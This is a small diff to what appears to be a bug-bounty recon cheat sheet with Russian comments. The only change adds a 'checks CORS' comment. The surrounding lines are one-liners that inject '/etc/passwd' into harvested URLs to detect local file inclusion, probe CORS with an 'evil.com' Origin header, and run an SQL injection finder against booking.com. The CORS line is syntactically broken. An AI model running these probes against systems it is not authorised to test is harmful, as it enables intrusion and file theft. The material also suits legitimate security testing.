@@ -26,6 +26,7 @@
 * cat aliveSubs.txt | gau | uro | gf lfi | tee lfi.txt
 * nuclei -l target.txt -tags lfi
 * cat aliveSubs.txt | gau | uro | gf lfi | qsreplace  "/etc/passwd" | while read url; do curl -silent "$url" | grep "root:x:" && echo "$url is Vulnerable"; done;
+# проверяет CORS 
 * site=$(cat target.txt); gau $site | while read url; do target=$(curl -sIH Origin: https://evil.com -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found] echo $url; else echo Nothing on $url; fi; done
 # проверяет sqli tool [sqliFinder](https://github.com/americo/sqlifinder)
 * python3 sqlifinder.py -d booking.com
